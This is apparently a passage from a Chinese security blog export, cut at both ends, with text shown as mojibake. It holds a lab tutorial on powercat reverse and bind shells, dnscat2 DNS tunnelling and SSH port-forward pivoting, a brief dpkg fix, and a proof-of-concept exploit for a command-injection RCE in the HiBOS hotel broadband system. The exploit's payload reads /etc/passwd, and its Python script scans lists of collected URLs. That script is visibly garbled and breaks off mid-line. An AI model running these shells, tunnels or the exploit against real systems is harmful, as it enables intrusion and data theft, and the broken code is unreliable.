<h5 id="powercatä½¿ç”¨"><a href="#powercatä½¿ç”¨" class="headerlink" title="powercatä½¿ç”¨"></a>powercatä½¿ç”¨</h5><p>powercatå¯ä»¥ç†è§£æˆpowershellç‰ˆçš„natcat,</p>
<p>ä¸‹è½½åœ°å€ï¼š <a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p>ä¸‹è½½ä¸‹æ¥çš„powercat.ps1æ–‡ä»¶ è¿›è¡Œå¯¼å…¥<code> Import-Module .\powercat.ps1</code></p>
<p>å¦‚æœæƒé™ä¸è¶³ ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€powershell<code>Set-ExecutionPolicy Unrestricted</code>è¾“å…¥Y</p>
<p><code>Get-ExecutionPolicy</code>æŸ¥çœ‹å½“å‰psæƒé™</p>
<p> <code>powercat -h</code>æµ‹è¯•æ˜¯å¦å¯¼å…¥æˆåŠŸ</p>
<p><img src="/posts/11ff0b53/powercat1.png"></p>
<p>åœ¨win10ä¸­æ›´æ”¹poweshellæƒé™ <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code>ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œåœ¨æœ¬æœºè¿›è¡Œå°è¯•æ—¶ï¼Œæ¯æ¬¡å¯¼å…¥æ¨¡å—åç³»ç»Ÿéƒ½ä¼šå°†powercat.ps1åˆ é™¤æ‰â€¦</p>
<blockquote>
<p>#powercat  å‘½ä»¤å‚æ•°</p>
<p>-l ç›‘å¬æ¨¡å¼</p>
<p>-p æŒ‡å®šç›‘å¬ç«¯å£</p>
<p>-e æŒ‡å®šå¯åŠ¨è¿›ç¨‹çš„åç§°</p>
<p>-v æ˜¾ç¤ºè¯¦æƒ…</p>
<p>-c æŒ‡å®šæƒ³è¦è¿æ¥çš„ IP åœ°å€</p>
<p>-ep è¿”å› powershell -dns ä½¿ç”¨ dns é€šä¿¡</p>
<p>-g ç”Ÿæˆ payload -ge ç”Ÿæˆç»è¿‡ç¼–ç çš„ payloadï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ powershell </p>
<p>-e æ‰§è¡Œè¯¥ payload</p>
</blockquote>
<h6 id="é€šè¿‡ncæ­£å‘è¿æ¥powercat"><a href="#é€šè¿‡ncæ­£å‘è¿æ¥powercat" class="headerlink" title="é€šè¿‡ncæ­£å‘è¿æ¥powercat"></a>é€šè¿‡ncæ­£å‘è¿æ¥powercat</h6><p>win7ï¼š<code>powercat -l -p 8888 -e cmd.exe -v</code></p>
<p>kaliï¼š<code>nc 192.168.0.129 8888</code></p>
<p><img src="/posts/11ff0b53/powercat_shell1.png"></p>
<h6 id="é€šè¿‡ncåå‘è¿æ¥powercat"><a href="#é€šè¿‡ncåå‘è¿æ¥powercat" class="headerlink" title="é€šè¿‡ncåå‘è¿æ¥powercat"></a>é€šè¿‡ncåå‘è¿æ¥powercat</h6><p>kaliï¼š<code>nc -l -p 8888 -v </code></p>
<p>win7ï¼š<code>powercat -c 192.168.0.128 -p 8888 -v -e cmd.exe</code></p>
<h6 id="è¿”å›powershell"><a href="#è¿”å›powershell" class="headerlink" title="è¿”å›powershell"></a>è¿”å›powershell</h6><p>win7ï¼š<code>powercat -l -v -p 8888</code></p>
<p>win2008ï¼š<code>powercat -c 192.168.0.129 -p 8888 -v -ep</code></p>
<p><img src="/posts/11ff0b53/powercat_shell3.png"></p>
<h6 id="powercat-ç”Ÿæˆpaylaod"><a href="#powercat-ç”Ÿæˆpaylaod" class="headerlink" title="powercat ç”Ÿæˆpaylaod"></a>powercat ç”Ÿæˆpaylaod</h6><p>win7ï¼š <code>Powercat -l -p 8888 -e cmd -v -g &gt;&gt;shell.ps1</code> å°†shell.ps1ä¼ åˆ°win2008å¹¶æ‰§è¡Œ</p>
<p>win7ï¼š<code>powercat -c 192.168.0.132 -p 8888 -v</code></p>
<p>è¿™é‡Œè¯•äº†å¥½å‡ æ¬¡éƒ½æ²¡æˆåŠŸâ€¦â€¦.</p>
<p>ä¸æƒ³ç”Ÿæˆæ–‡ä»¶çš„è¯ä»¬å¯ä»¥ä½¿ç”¨ -ge ç”Ÿæˆç¼–ç åçš„payload</p>
<p>win7ï¼š<code>powercat -c 192.168.0.129 -p 8888 -ep -ge</code></p>
<h6 id="åˆ›å»ºdnséš§é“è¿æ¥"><a href="#åˆ›å»ºdnséš§é“è¿æ¥" class="headerlink" title="åˆ›å»ºdnséš§é“è¿æ¥"></a>åˆ›å»ºdnséš§é“è¿æ¥</h6><p>åœ¨kaliä¸Šå®‰è£…discat</p>
<blockquote>
<p>git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a><br>cd dnscat2/server/<br>gem install bundler<br>bundle install</p>
</blockquote>
<p>åŒæ—¶å®‰è£…rubyç¯å¢ƒ</p>
<p>å¼€å¯æœåŠ¡ç«¯ <code>ruby dnscat2.rb powercat -e open --no-cache</code></p>
<p>åœ¨win7ç›®æ ‡æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ å»ºç«‹dnséš§é“</p>
<p><code>powercat -c 192.168.0.128 -p 53 -dns powercat -e cmd.exe</code> è¿™é‡Œipä¸ºkali ip</p>
<p><img src="/posts/11ff0b53/powercat_win7.PNG"></p>
<p>åœ¨win7æ‰§è¡Œå®Œå‘½ä»¤åä¼šè·å¾—ä¸€ä¸ªsession</p>
<p><img src="/posts/11ff0b53/powercat_dns_shell.PNG"></p>
<p><code>session -i 1</code></p>
<p><img src="/posts/11ff0b53/powercat_dns_shell2.PNG"></p>
<p>ä½†æ˜¯ä½¿ç”¨è¯¥éš§é“åœ¨æ‰§è¡Œå‘½ä»¤æ—¶ä¼šæœ‰äº›å¡ï¼Œä¸å»ºè®®ä½¿ç”¨</p>
<h6 id="powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘"><a href="#powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘" class="headerlink" title="powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘"></a>powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘</h6><p>kaliï¼š192.168.0.128</p>
<p>win7ï¼š192.168.0.129</p>
<p>win2008ï¼š192.168.0.132</p>
<p>win7åšè·³æ¿ï¼Œè®©kalié€šè¿‡win7è¿æ¥win2008</p>
<p>win2008  <code>powercat -l -v -p 4444 -e cmd.exe</code></p>
<p>win7 <code>powercat -l -v -p 5555 -r tcp:192.168.0.132:4444</code></p>
<p>kali <code>nc  192.168.0.129 5555 -vv</code></p>
<hr>
<h3 id="SSHéš§é“"><a href="#SSHéš§é“" class="headerlink" title="SSHéš§é“"></a>SSHéš§é“</h3><h4 id="SSHåŠŸèƒ½ï¼š"><a href="#SSHåŠŸèƒ½ï¼š" class="headerlink" title="SSHåŠŸèƒ½ï¼š"></a>SSHåŠŸèƒ½ï¼š</h4><p> 1.<strong>åŠ å¯†</strong>SSH Client ç«¯å€¼ SSH Server ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ®</p>
<p>2.<strong>çªç ´é˜²æŠ¤å¢™çš„é™åˆ¶</strong>å®Œæˆä¸€äº›æ— æ³•å»ºç«‹çš„TCPè¿æ¥</p>
<h4 id="å¸¸è§„æ“ä½œ"><a href="#å¸¸è§„æ“ä½œ" class="headerlink" title="å¸¸è§„æ“ä½œ"></a>å¸¸è§„æ“ä½œ</h4><p><code>ssh root@192.168.0.129 -P 22</code></p>
<p>æœ¬è´¨ä¸ºç«¯å£è½¬å‘</p>
<blockquote>
<p>ç¯å¢ƒé…ç½®<br>win7    192.168.0.129(NAT)  10.10.0.130(ä»…ä¸»æœº)<br>kali        192.168.0.128(NAT)<br>ubuntu 192.168.0.130(NAT)<br>win2008  10.10.0.131(ä»…ä¸»æœº)</p>
</blockquote>
<h4 id="å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»"><a href="#å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»" class="headerlink" title="å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»"></a>å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»</h4><p>1..è¿œç¨‹ä¸»æœºæ”¶åˆ°ç”¨æˆ·ç™»å½•è¯·æ±‚ï¼Œå§è‡ªå·±çš„å…¬é’¥å‘ç»™ç”¨æˆ·</p>
<p>2.ç”¨æˆ·ä½¿ç”¨è¯¥å…¬é’¥ï¼Œå°†å¯†ç åŠ å¯†åï¼Œå‘ç»™è¿œç¨‹ä¸»æœº</p>
<p>3.è¿œç¨‹ä¸»æœºç”¨è‡ªå·±çš„ç§é’¥ï¼Œè§£å¯†ç™»å½•å¯†ç ï¼Œå¦‚æœå¯†ç æ­£ç¡®ï¼Œç”¨æˆ·å°±èƒ½ç™»å½•</p>
<blockquote>
<p>æœåŠ¡å™¨  ==========&gt; ç”¨æˆ· =====================&gt; æœåŠ¡å™¨  </p>
<p>â€”â€”â€”â€”å‘é€å…¬é’¥â€”â€”â€”â€“åˆ©ç”¨å…¬é’¥åŠ å¯†ç§é’¥å¹¶å‘é€â€”-å¯†ç éªŒè¯ï¼ˆY/Nï¼‰</p>
</blockquote>
<br>

<p>SSHéš§é“åŸç†</p>
<ul>
<li>æœ¬åœ°ç«¯å£è½¬å‘</li>
</ul>
<blockquote>
<p>client/kali â€”â€”â€”â€”â€” è·³è½¬æœº ubnutu â€”â€”â€”â€”â€”-server/win2008</p>
<p>192.168.0.128â€”â€”â€”â€“jump/192.168.0.129â€”â€”â€”â€”10.10.0.135</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“10.10.0.137â€”â€”â€”â€”â€”â€”â€”</p>
</blockquote>
<p><code>ssh -L æœ¬åœ°ç«¯å£:ç›®æ ‡ä¸»æœº:ç›®æ ‡ç«¯å£  jumpä¸»æœºhost</code></p>
<p><code>ssh -L 2121:10.10.0.2:21 root@192.168.0.129</code></p>
<blockquote>
<p>å»ºç«‹SSHéš§é“å¸¸ç”¨å‚æ•°<br>-C å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ã€‚<br> -f å°† SSH ä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰ shell<br>-N å»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ä½†çœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰<br> -g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚<br> -L æœ¬åœ°ç«¯å£è½¬å‘<br> -R è¿œç¨‹ç«¯å£è½¬å‘<br> -D åŠ¨æ€è½¬å‘ï¼ˆ SOCKS ä»£ç†ï¼‰<br> -p æŒ‡å®š SSH ç«¯å£</p>
</blockquote>
<ul>
<li>è¿œç¨‹ç«¯å£è½¬å‘</li>
</ul>
<blockquote>
<p>client/ kaliâ€”â€”â€”â€”â€”â€“jump/ubuntuâ€”â€”â€”â€”â€”â€”-server/win2008</p>
<p>192.168.0.128â€”â€”â€”â€”â€“10.10.0.129    â€”â€”â€”â€”â€”â€”â€”10.10.0.135</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”æ²¡æœ‰å¤–ç½‘ipâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”-ä½†æ˜¯å¯ä»¥è¿æ¥å¤–ç½‘â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
</blockquote>
<p>è·³è½¬æœºä¸ºçº¯å†…ç½‘ç¯å¢ƒï¼Œä½†æ˜¯å¯ä»¥è®¿é—®å¤–ç½‘</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè·³è½¬æœºå¯ä»¥è®¿é—®kaliï¼Œkaliæ— æ³•è®¿é—®è·³è½¬æœºï¼Œåœ¨è·³è½¬æœºä¸Šå»ºç«‹ä¸€ä¸ªä¸kaliçš„è¿æ¥ï¼Œç„¶åå†kaliä¸Šä½¿ç”¨è¿™ä¸ªè¿æ¥  ç„¶åå°†æ‰€æœ‰æ•°æ®é€šè¿‡è·³è½¬æœºè½¬å‘ç»™ç›®æ ‡ä¸»æœºçš„ç›®æ ‡ç«¯å£  (åœ¨è¿™é‡Œè¿œç¨‹ä¸»æœºä¸ºkali)</p>
<p><code>ssh -R è¿œç¨‹ä¸»æœºç«¯å£:ç›®æ ‡ä¸»æœºï¼šç›®æ ‡ä¸»æœºç«¯å£ è·³è½¬æœº</code></p>
<p><code>ssh -R 2121:10.10.0.135:21  10.10.0.129</code></p>
<blockquote>
<p>å»ºç«‹SSHéš§é“å¸¸ç”¨å‚æ•°<br>-C å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ã€‚<br> -f å°† SSH ä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰ shell<br>-N å»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ä½†çœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰<br> -g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚<br> -L æœ¬åœ°ç«¯å£è½¬å‘<br> -R è¿œç¨‹ç«¯å£è½¬å‘<br> -D åŠ¨æ€è½¬å‘ï¼ˆ SOCKS ä»£ç†ï¼‰<br> -p æŒ‡å®š SSH ç«¯å£</p>
</blockquote>
<ul>
<li>åŠ¨æ€è½¬å‘</li>
</ul>
<p>å»ºç«‹ä¸€ä¸ª socks è¿æ¥ï¼Œä»»ä½•æ”¯æŒ socks 4/5 åè®®çš„ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠ å¯†é€šé“è¿›è¡Œè®¿é—®</p>
<p>å¯ä»¥å‚è€ƒæ¢¯ å­ </p>
<p><code>ssh -D 8080 user@host</code></p>
<blockquote>
<p>å¤–ç½‘å»è®¿é—®å†…ç½‘ä¸­çš„äºŒçº§æœåŠ¡å™¨</p>
<p>å¤–ç½‘  â€”â€”â€”â€”â€”  ä¸€çº§æœåŠ¡å™¨ â€”â€”â€“é˜²ç«å¢™  â€”â€”â€“ äºŒçº§æœåŠ¡å™¨<br>â€”â€”â€“å¤–ç½‘    |  å†…ç½‘  â€”â€”â€” äºŒçº§æœåŠ¡å™¨åªèƒ½é€šè¿‡ä¸€çº§æœåŠ¡å™¨è®¿é—®</p>
<p>åœ¨ä¸€çº§æœåŠ¡å™¨ä¸Šé€šè¿‡æœ¬åœ°ç«¯å£è½¬å‘ï¼ŒæŠŠäºŒçº§æœåŠ¡å™¨ä¸Šçš„æµé‡å¯¼åˆ°ä¸€çº§æœåŠ¡å™¨ä¸Šã€‚è¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€çº§æœåŠ¡å™¨å»è®¿é—®äºŒçº§æœåŠ¡å™¨ã€‚ æ‰€ä»¥ äºŒçº§æœåŠ¡å™¨ä¸­çš„æœåŠ¡å™¨å¯ä»¥é€šè¿‡è¿œç¨‹ç«¯å£è½¬å‘çš„æ–¹æ³•ç›´æ¥æ˜ å°„åˆ°å¤–ç½‘çš„ä¸»æœºï¼Œå°†äºŒçº§å†…ç½‘çš„æµé‡ç›´æ¥å¯¼å…¥åˆ°å¤–ç½‘ä¸»æœºçš„ç«¯å£ï¼Œä»è€Œå®ç°ä»å¤–ç½‘å»è®¿é—®äºŒçº§ä¸»æœº</p>
</blockquote>
<br>

<h4 id="SSHéš§é“åˆ©ç”¨"><a href="#SSHéš§é“åˆ©ç”¨" class="headerlink" title="SSHéš§é“åˆ©ç”¨"></a>SSHéš§é“åˆ©ç”¨</h4><h5 id="æœ¬åœ°ç«¯å£è½¬å‘"><a href="#æœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="æœ¬åœ°ç«¯å£è½¬å‘"></a>æœ¬åœ°ç«¯å£è½¬å‘</h5><h6 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h6><blockquote>
<p>kali 192.168.0.128ï¼ˆNATï¼‰<br>winserver2008  10.10.0.139ï¼ˆVM18 ä»…ä¸»æœºï¼‰<br>Ubuntu 192.168.0.130ï¼ˆNATï¼‰10.10.0.137ï¼ˆVM18 ä»…ä¸»æœºï¼‰</p>
</blockquote>
<br>

<blockquote>
<p>å¼€å¯ winServer2008 è¿œç¨‹è¿æ¥ <a href="https://www.cnblogs.com/Tanghongchang/p/7445786.html">https://www.cnblogs.com/Tanghongchang/p/7445786.html</a></p>
</blockquote>
<p>kaliæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†å†…ç½‘ä¸»æœºçš„3389ç«¯å£æ˜ å°„åˆ°è‡ªå·±çš„3389ç«¯å£</p>
<p><code>ssh -CfNg -L æ”»å‡»ä¸»æœºç«¯å£:å†…ç½‘åŠå…¬ä¸»æœºIP:å†…ç½‘åŠå…¬ä¸»æœºç«¯å£ WebæœåŠ¡å™¨sshç”¨æˆ·å@WebæœåŠ¡å™¨IP</code></p>
<p><code>ssh -CfNg -L 3333:10.10.0.139:3389 mamor@192.168.0.130 </code></p>
<p>é€šè¿‡æœåŠ¡å™¨ 192.168.0.139ä½œä¸ºè·³æ¿ å°†å†…ç½‘ä¸»æœºwinServer2008 çš„3389ç«¯å£è½¬å‘åˆ°kaliçš„3388ç«¯å£ï¼Œç„¶åè®¿é—®kaliçš„3333ç«¯å£å³å¯è®¿é—®åˆ°WinServer2008çš„3389ç«¯å£äº†</p>
<p>ä½¿ç”¨netstat è¿›è¡Œåˆ¤æ–­æ˜¯å¦å»ºç«‹ä»£ç†è½¬å‘</p>
<p><code>netstat -pantu | grep &quot;3333&quot;</code></p>
<p><img src="/posts/11ff0b53/ssh_bendi1.png"></p>
<p>ï¼ˆè¿æ¥è¢«é‡è®¾ï¼šæˆ‘å…ˆåœ¨winServer2008ä¸­æ‰“å¼€äº†è¿œç¨‹æœåŠ¡ ç„¶åç”¨Vm18ç½‘æ®µçš„æœºå™¨æµ‹è¯•å®Œ ä¹‹åå‘ç°winServer2008çš„ipå˜äº†ï¼Œç„¶åä¸€ç›´åœ¨æ‰¾åŸå›  ä¸ºä»€ä¹ˆè¿ä¸åŒäº†â€¦ç„¶åæ”¹ä¸‹sshå‘½ä»¤çš„winserver ipå°±å¥½äº†ï¼‰ </p>
<p>ç„¶åè¾“å…¥è´¦å·å¯†ç  å³å¯ç™»å½•åˆ°10.10.0.139 winServer2008æœåŠ¡å™¨ä¸­</p>
<p><img src="/posts/11ff0b53/ssh_bendi2.png"></p>
<h5 id="è¿œç¨‹ç«¯å£è½¬å‘"><a href="#è¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="è¿œç¨‹ç«¯å£è½¬å‘"></a>è¿œç¨‹ç«¯å£è½¬å‘</h5><p>ç¯å¢ƒ</p>
<blockquote>
<p>kali 192.168.0.128(NATæ¨¡å¼)</p>
<p>Ubuntu 10.10.0.137(VM18 ä»…ä¸»æœº)</p>
<p>winServer2008 10.10.0.139 (VM18ä»…ä¸»æœº)0</p>
</blockquote>
<blockquote>
<p>åˆ é™¤Ubuntuçš„nat ç½‘å¡ï¼Œç°åœ¨ä»…æœ‰VM18ä¸€å—ç½‘å¡(10.10.0.0/24ç½‘æ®µçš„)</p>
<p>ä½†æ˜¯åœ¨è®¾ç½®ç½‘ç»œçš„æ—¶å€™æ²¡æ‰¾åˆ°ç›¸å…³çš„æ–‡å­—ï¼Œæ²¡æˆåŠŸè¿ä¸Šå¤–ç½‘ï¼Œä¹‹åæœ‰æ—¶é—´æ•´ä¸ªvpså¤ç°</p>
</blockquote>
<p><code>ssh -R è¿œç¨‹ä¸»æœºç«¯å£:ç›®æ ‡ä¸»æœºï¼šç›®æ ‡ä¸»æœºç«¯å£ è·³è½¬æœº</code></p>
<p>ä½¿ç”¨ -R åˆ›å»ºä¸€ä¸ªè¿œç¨‹è½¬å‘æ¨¡å¼çš„éš§é“</p>
<p><code>ssh -CfNg -R 3333:10.10.0.139:3389  mamor@192.168.0.130</code></p>
<p>ä½¿ç”¨<code>netstat</code>åˆ¤æ–­ä»£ç†è½¬å‘æ˜¯å¦æˆåŠŸå»ºç«‹</p>
<p><code>netstat  -ano | grep &quot;3333&quot; </code></p>
<p><code>rdesktop 127.0.0.1:3333</code></p>
<br>

<h5 id="åŠ¨æ€è½¬å‘"><a href="#åŠ¨æ€è½¬å‘" class="headerlink" title="åŠ¨æ€è½¬å‘"></a>åŠ¨æ€è½¬å‘</h5><h6 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h6><blockquote>
<p>kali 192.168.0.128(NAT)</p>
<p>Ubuntu 192.168.0.130(NAT) 10.10.0.137(VM18 ä»…ä¸»æœº)</p>
<p>WinServer2008 10.10.0.139(VM18 ä»…ä¸»æœº)</p>
</blockquote>
<br>

<p><code>ssh -CfNg -D æ”»å‡»ä¸»æœºç«¯å£ WebæœåŠ¡å™¨sshç”¨æˆ·å@WebæœåŠ¡å™¨IP</code></p>
<p> <code>ssh -CfNg -D 8888  mamor@192.168.0.130</code></p>
<p>ç„¶åä½¿ç”¨proxychains4 ä»£ç†</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>æ·»åŠ <code>socks5 127.0.0.1 8888</code></p>
<p>ç„¶åä½¿ç”¨<code>proxychains4 firefox 10.10.0.139 </code>æˆåŠŸè®¿é—®åˆ°å†…ç½‘WinServer2008 çš„webé¡µé¢</p>
<p><img src="/posts/11ff0b53/ssh_dongtai1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai2.png"></p>
<p>ä½†æ˜¯ ä½¿ç”¨firefoxçš„ä»£ç†æ’ä»¶SwitchyOmega æ— æ³•è®¿é—®å†…ç½‘çš„webé¡µé¢</p>
<p>ä½¿ç”¨proxychains4 è®¿é—®WinServer2008çš„3389ç«¯å£</p>
<p><code>proxychains4 rdesktop 10.10.0.139:3389 </code></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop2.png"></p>
<p>æˆåŠŸè®¿é—®3389ç«¯å£</p>
<br>

<hr>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
<p><a href="https://c.wgpsec.org/p/10053">https://c.wgpsec.org/p/10053</a></p>
<p><a href="https://www.icode9.com/content-3-780098.html">https://www.icode9.com/content-3-780098.html</a></p>
<p><a href="https://yoga7xm.top/2019/03/27/IPentest-discover/">https://yoga7xm.top/2019/03/27/IPentest-discover/</a></p>
<p><a href="https://www.cnblogs.com/-chenxs/p/12378110.html">https://www.cnblogs.com/-chenxs/p/12378110.html</a></p>
<p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p>
<p><a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://teamssix.com/year/210601-155103.html">https://teamssix.com/year/210601-155103.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>E:dpkgè¢«ä¸­æ–­ï¼Œæ‚¨å¿…é¡»æ‰‹å·¥è¿è¡Œsudodpkg</title>
    <url>/posts/14f5ef78/</url>
    <content><![CDATA[<p>è§£å†³æ–¹æ³•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;updates&#x2F;*</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>HiBOSé…’åº—å®½å¸¦è¿è¥ç³»ç»ŸRCEæ¼æ´POC</title>
    <url>/posts/c20f4593/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">url + &#x2F;manager&#x2F;radius&#x2F;server_ping.php?ip&#x3D;127.0.0.1|cat &#x2F;etc&#x2F;passwd &gt;..&#x2F;..&#x2F;aaa.txt&amp;id&#x3D;1</span><br><span class="line">è®¿é—® url + &#x2F;aaa.txt</span><br><span class="line"></span><br><span class="line">å¦‚æœå­˜åœ¨ root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">è¯´æ˜æ¼æ´å­˜åœ¨</span><br></pre></td></tr></table></figure>

<p>v0.1å•çº¿ç¨‹ç‰ˆ åç»­å®Œå–„ ç”¨æ³•<br><code>python3 poc.py -u url</code><br><code>python3 poc.py -f url.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOSé…’åº—å®½å¸¦è¿è¥ç³»ç»ŸRCEæ¼æ´POCv0.1  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]urlå½¢å¼ä¸ç¬¦åˆï¼ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">%<span class="number">20</span>&gt;../../aaa.txt&amp;<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    req = requests.get(url=url1, headers=header, verify=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    url2 = url + &#x27;</span>/aaa.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    req2 = requests.get(url=url2, headers=header, verify=False)</span></span><br><span class="line"><span class="string">    if &#x27;</span>root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash<span class="string">&#x27; in req2.text:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;--------------å­˜åœ¨æ¼æ´[*]&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;-------------ä¸å­˜åœ¨æ¼æ´[*]&quot;)</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    parser = OptionParser()</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, default = &#x27;</span><span class="string">&#x27; , type=str, help=&#x27;</span>è¾“å…¥url<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;file&quot;, default= &#x27;</span><span class="string">&#x27;, help=&#x27;</span>æ”¶é›†çš„txt<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    (option, args) = parser.parse_args()</span></span><br><span class="line"><span class="string">    # print(parser.parse_args())</span></span><br><span class="line"><span class="string">    url = option.url</span></span><br><span class="line"><span class="string">    file = option.file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if file != &#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        print(&quot;[*] Start .......              [*]&quot;)</span></span><br><span class="line"><span class="string">        with open(file,&#x27;</span><span class="string">r&#x27;) as 